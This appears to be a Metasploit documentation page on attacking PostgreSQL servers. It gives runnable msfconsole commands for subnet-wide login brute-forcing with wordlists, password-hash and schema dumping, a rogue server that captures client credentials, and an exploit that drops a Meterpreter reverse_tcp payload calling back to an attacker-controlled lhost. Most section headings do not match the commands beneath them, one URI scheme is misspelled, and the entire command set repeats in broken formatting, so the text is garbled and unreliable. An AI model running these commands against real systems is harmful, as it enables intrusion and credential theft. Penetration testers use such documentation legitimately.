## PostgreSQL Workflows
There are more modules than listed here, for the full list of modules run the `search` command within msfconsole:
```msf
msf6 > search postgres
```

Or to search for modules that work with a specific session type:
```msf
msf6 > search session_type:postgres
```

### Lab Environment
When testing in a lab environment PostgreSQL can either be installed on the host machine or within Docker:
```
use auxiliary/scanner/postgres/postgres_version
run postgres://192.168.123.13
run postgres://postgres:password@192.168.123.13
```

### PostgreSQL Enumeration
Enumerate version:
```
use auxiliary/scanner/postgres/postgres_login
run 'postgres://root: a b c p4$$w0rd@127.0.0.1'
```

### PostgreSQL Login / Bruteforce
If you have PostgreSQL credentials to validate:
```
use auxiliary/scanner/postgres/postgres_login
run cidr:/24:myspostgresl://user:pass@192.168.222.0 threads=50
```

Re-using PostgreSQL credentials in a subnet:
```
use auxiliary/scanner/postgres/postgres_login
run postgres://user:pass@192.168.123.6:2222
```

Using an alternative port:
```
use auxiliary/scanner/postgres/postgres_login
run postgres://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
```

Brute-force host with known user and password list:
```
use auxiliary/scanner/postgres/postgres_login
run postgres://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
```

Brute-force credentials:
```
use auxiliary/scanner/postgres/postgres_login
run cidr:/24:postgres://user:pass@192.168.222.0 threads=50
run cidr:/24:postgres://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
```

Brute-force credentials in a subnet:
```msf
msf6 auxiliary(scanner/postgres/postgres_login) > run rhost=127.0.0.1 rport=5432 username=postgres password=password database=template1 createsession=true
```

### Obtaining an Interactive Session
For example:
```msf
[+] 127.0.0.1:5432 - Login Successful: postgres:password@template1
[*] PostgreSQL session 1 opened (127.0.0.1:61324 -> 127.0.0.1:5432) at 2024-03-15 14:00:12 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Should yield:
```msf
msf6 auxiliary(scanner/postgres/postgres_login) > sessions

Active sessions
===============

  Id  Name  Type        Information                           Connection
  --  ----  ----        -----------                           ----------
  1         postgresql  PostgreSQL postgres @ 127.0.0.1:5432  127.0.0.1:61324 -> 127.0.0.1:5432 (127.0.0.1)

msf6 auxiliary(scanner/postgres/postgres_login) > sessions -i 1
[*] Starting interaction with 1...
```

Use the help command for more info.
```
use auxiliary/server/capture/postgresql
run
```

When interacting with a session, the help command can be useful:
```msf
msf6 auxiliary(server/capture/postgresql) >
[*] Started service listener on 0.0.0.0:5432
[*] Server started.
[+] PostgreSQL LOGIN 127.0.0.1:60406 postgres / mysecretpassword / postgres
```

Once you've done that, you can run any Postgres query against the target using the `query` command:
```
use auxiliary/scanner/postgres/postgres_hashdump
run postgres://postgres:password@192.168.123.13
run postgres://postgres:password@192.168.123.13/database_name
```

Alternatively you can enter a SQL prompt via the `query_interactive` command which supports multiline commands:
```
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:password@192.168.123.13
run postgres://postgres:password@192.168.123.13 ignored_databases=template1,template0,postgres
```

### PostgreSQL Capture Server
Captures and log PostgreSQL credentials:
```
use auxiliary/admin/postgres/postgres_sql
run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()'
```

For example, if a client connects with:
```
use exploit/linux/postgres/postgres_payload
run postgres://postgres:password@192.168.123.6 lhost=192.168.123.1 lport=5000 payload=linux/x64/meterpreter/reverse_tcp target='Linux\ x86_64'
```

`msf
msf6 > search postgres
`

`msf
msf6 > search session_type:postgres
`

`
use auxiliary/scanner/postgres/postgres_version
run postgres://192.168.123.13
run postgres://postgres:password@192.168.123.13
`

`
use auxiliary/scanner/postgres/postgres_login
run 'postgres://root: a b c p4$$w0rd@127.0.0.1'
`

`
use auxiliary/scanner/postgres/postgres_login
run cidr:/24:myspostgresl://user:pass@192.168.222.0 threads=50
`

`
use auxiliary/scanner/postgres/postgres_login
run postgres://user:pass@192.168.123.6:2222
`

`
use auxiliary/scanner/postgres/postgres_login
run postgres://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
`

`
use auxiliary/scanner/postgres/postgres_login
run postgres://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
`

`
use auxiliary/scanner/postgres/postgres_login
run cidr:/24:postgres://user:pass@192.168.222.0 threads=50
run cidr:/24:postgres://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
`

`msf
msf6 auxiliary(scanner/postgres/postgres_login) > run rhost=127.0.0.1 rport=5432 username=postgres password=password database=template1 createsession=true
`

`msf
[+] 127.0.0.1:5432 - Login Successful: postgres:password@template1
[*] PostgreSQL session 1 opened (127.0.0.1:61324 -> 127.0.0.1:5432) at 2024-03-15 14:00:12 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
`

`msf
msf6 auxiliary(scanner/postgres/postgres_login) > sessions

Active sessions
===============

  Id  Name  Type        Information                           Connection
  --  ----  ----        -----------                           ----------
  1         postgresql  PostgreSQL postgres @ 127.0.0.1:5432  127.0.0.1:61324 -> 127.0.0.1:5432 (127.0.0.1)

msf6 auxiliary(scanner/postgres/postgres_login) > sessions -i 1
[*] Starting interaction with 1...
`

`
use auxiliary/server/capture/postgresql
run
`

`msf
msf6 auxiliary(server/capture/postgresql) >
[*] Started service listener on 0.0.0.0:5432
[*] Server started.
[+] PostgreSQL LOGIN 127.0.0.1:60406 postgres / mysecretpassword / postgres
`

`
use auxiliary/scanner/postgres/postgres_hashdump
run postgres://postgres:password@192.168.123.13
run postgres://postgres:password@192.168.123.13/database_name
`

`
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:password@192.168.123.13
run postgres://postgres:password@192.168.123.13 ignored_databases=template1,template0,postgres
`

`
use auxiliary/admin/postgres/postgres_sql
run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()'
`

`
use exploit/linux/postgres/postgres_payload
run postgres://postgres:password@192.168.123.6 lhost=192.168.123.1 lport=5000 payload=linux/x64/meterpreter/reverse_tcp target='Linux\ x86_64'
`

